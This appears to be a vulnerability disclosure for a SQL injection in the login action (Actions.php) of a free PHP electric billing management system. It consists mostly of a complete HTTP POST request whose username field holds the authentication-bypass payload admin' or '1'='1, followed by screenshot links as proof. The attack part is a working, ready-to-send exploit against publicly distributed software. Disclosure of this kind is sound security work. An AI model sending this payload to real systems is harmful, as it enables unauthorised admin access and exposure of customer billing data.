electric-billing-management-system Action.php SQL-inject

Exploit Title: electric-billing-management-system Action.php SQL-inject

Exploit Author: webraybtl@webray.com.cn inc

Vendor Homepage: https://www.sourcecodester.com/php/14967/electric-billing-management-system-php-and-sqlite-free-source-code.html

Software Link: https://www.sourcecodester.com/php/14967/electric-billing-management-system-php-and-sqlite-free-source-code.html

CMSName: electric-billing-management-system

Tested on: Windows, Apache ,Mysql

Description

The reason for the SQL injection vulnerability is that the website application did not verify the validity of the data submitted by the user to the server (such as type, length, business parameter validity, etc.), nor did it effectively filter the data input by the user with special characters, thus directly inputting the user's input into the database for execution. This exceeded the expected result of the original design of the SQL statement. The system did not filter the username parameter content correctly in the Actionphp file, resulting in SQL injection using a universal password to bypass login restrictions

    Payload used:
    
    POST /electric_billing_0/electric_billing/Actions.php?a=login HTTP/1.1
    Host: 192.168.2.107
    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:129.0) Gecko/20100101 Firefox/129.0
    Accept: application/json, text/javascript, */*; q=0.01
    Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
    Accept-Encoding: gzip, deflate
    Content-Type: application/x-www-form-urlencoded; charset=UTF-8
    X-Requested-With: XMLHttpRequest
    Content-Length: 40
    Origin: http://192.168.2.107
    Connection: close
    Referer: http://192.168.2.107/electric_billing_0/electric_billing/admin/login.php
    Cookie: PHPSESSID=g06tfgab6s50lnkbbi55rl10bb
    Priority: u=0
  
    username=admin'+or+'1'%3D'1&password=123
Proof of Concept
![image](https://github.com/user-attachments/assets/1fb089d2-a1a1-45a5-a0b4-c18582d7ae52)

![f7e6c0938af23e98a2b858eac7728b7](https://github.com/user-attachments/assets/d3aec4c3-1f54-45ba-a60c-3889e570db1e)
![image](https://github.com/user-attachments/assets/48c548b5-f81c-42e8-ae57-9f847dbf5702)



